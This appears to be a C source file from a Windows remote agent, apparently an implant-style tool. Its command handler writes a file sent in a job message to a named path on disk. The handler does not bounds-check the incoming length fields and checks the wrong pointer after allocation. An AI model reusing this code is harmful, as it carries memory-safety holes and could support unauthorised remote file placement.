#include "error.h"
#include "message.h"
#include "debug.h"
#include <Windows.h>

/*
@brief Function that puts a file
@param PMESSAGE containts the parameters for the command
@param PMESSAGE is a pointer to the result that will be sent back
@return ERROR_T with status of dir
*/
ERROR_T PutCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pLocalFileLen = NULL;
    PCHAR pLocalFile = NULL;
    PDWORD pRemoteFileNameLen = NULL;
    PCHAR pRemoteFileName = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwBytesWritten = 0;
    


    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pLocalFileLen = (PDWORD) pMsg->pData;
    pLocalFile = (PCHAR) ((PBYTE) pLocalFileLen + sizeof(DWORD));
    pRemoteFileNameLen = (PDWORD) ((PBYTE) pLocalFile + *pLocalFileLen);
    pRemoteFileName = (PCHAR) ((PBYTE) pRemoteFileNameLen + sizeof(DWORD));

    DBG_PRINT("Putting: %d:%s\n", *pLocalFileLen, pRemoteFileName);

    hFile = CreateFileA(pRemoteFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        if (INVALID_HANDLE_VALUE == hFile) {
            DBG_PRINT("%d\n", GetLastError());
            iError = E_PUT_ERROR;
            goto end;
        }

    if (0 == WriteFile(hFile, pLocalFile, *pLocalFileLen, &dwBytesWritten, NULL))
    {
        iError = E_PUT_ERROR;
        goto end;
    }

end:
    if (INVALID_HANDLE_VALUE != hFile) {
        CloseHandle(hFile);
    }

    (*pResult)->hdr.dwCommand = pMsg->hdr.dwCommand;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    return iError;
}